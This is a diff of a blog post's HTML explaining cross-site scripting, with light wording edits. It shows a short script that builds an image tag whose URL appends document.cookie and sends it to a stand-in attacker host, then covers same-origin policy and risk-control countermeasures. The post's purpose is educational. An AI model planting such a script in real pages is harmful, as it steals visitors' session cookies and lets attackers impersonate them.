@@ -119,13 +119,13 @@
                     <ul class='ccode'>
                         <li><pre>&lt;script&gt;</pre></li>
                         <li><pre>    var fakeImage = document.createElement("img");</pre></li>
-                        <li><pre>    fakeImage.src = "attack_own_website.com/image.png?cookie=" + document.cookie;</pre></li>
+                        <li><pre>    fakeImage.src = "attacker_owned_website.com/image.png?cookie=" + document.cookie;</pre></li>
                         <li><pre>    document.appendChild(fakeImage);</pre></li>
                         <li><pre>&lt;/script&gt;</pre></li>
                     </ul>
                 </ccode>
                 <p>
-                    On first sight, it may seem this code is requesting an image from another server, which is very common thing to do in almost all webpages. No matter what that image is, or whether the request will succeed or not, the tricks here is not about the image, but the request itself. This seemingly simple request has the user's cookie concatenated to the requesting URL. So, when a user browses to the infected website with this piece of code in it, the browser will automatically try to fetch this image from the attacker's server while sending the user's cookie along with it.
+                    On first sight, it may seem this code is requesting an image from another server, which is a very common thing to do. No matter what that image is, or whether the request will succeed or not, the trick here is not about the image, but the request itself. This seemingly simple request has the user's cookie concatenated to the requesting URL. So, when a user browses to the infected website with this piece of code in it, the browser will automatically try to fetch this image from the attacker's server while sending the user's cookie along with it.
                 </p>
                 <p>
                     Since a user's cookie in many cases is the only thing that a server uses to validate the current user is indeed who he/she claims to be, the attacker can impersonate as the victim by using his/her cookie. If that stealed cookie happens to be linked to the victim's bank account or social media account, then it's up to the attacker's mercy to do whatever things he wants as he now has access to them. I recommend <a href="https://www.youtube.com/watch?v=T1QEs3mdJoc">Computerphile's video</a> in compensate to my terse explaination.
@@ -133,19 +133,20 @@
 
                 <h2>Countermeasures</h2>
                 <p>
-                    I have to say the examples I give in this post are only for demonstration and they are highly limited. Because XSS is such a famous type of attack, there are many countermeasures installed at many levels to protect user privacy.
+                    I have to say the examples I give in this post are only for demonstration and they are highly limited. Because XSS is such a well-known type of attack, there are many countermeasures installed at many levels to protect user privacy.
                 </p>
                 <p>
-                    Let's start with the most basic and effective countermeasure - the "Same-origin Policy". To my limited undertanding of this policy, it dictates that resources and scripts retrieved from different origins (servers, ports, etc) should not be able to share information about one another. So cookies will not be shared between two distinct sites, including images from other websites can be restricted (see image), and including pages from another origin is prohibited (so put google.com in an iframe as in the previous example will not work).
+                    Let's start with the most basic and effective countermeasure - the "Same-origin Policy". To my limited undertanding of this policy, it dictates that resources and scripts retrieved from different origins (from different servers, ports, etc) should not be able to share sensitive information with one another. So cookies will not be shared between two distinct sites. In addition, including images from other websites can also be restricted by detecting and comparing their sources as the image shown below.
                 </p>
 
                 <div style="text-align: center;">
                     <img src='imgs/Cross-Origin_Block.png' />
-                    <p>Trying to include a Chrome logo image from Wikipedia</p>
+                    <p>Error giving by Chrome when trying to include a Chrome logo image from Wikipedia</p>
                 </div>
 
+                <br>
                 <p>
-                    Then as another layer of protection, modern commercial websites have highly adequate Risk Control/Management Systems that captures and stops identity theft in action. They use trained models to capture the real user's behavior and once they found the current action is out of character, like logging in from a different location or with a different device, then more secure credentials are required in case the real user cookie is stolen.
+                    Then as another layer of protection, modern commercial websites have highly adequate Risk Control/Management Systems that captures and stops identity theft in action. They use trained models to capture the real user's behavior and once they found the current action is out of character, like logging in from a different location or with a different device, then more secure credentials (like the user's login password) are required to confirm the user's identity and proceed with the action.
                 </p>
 
                 <h3>Useful Links/References:</h3>
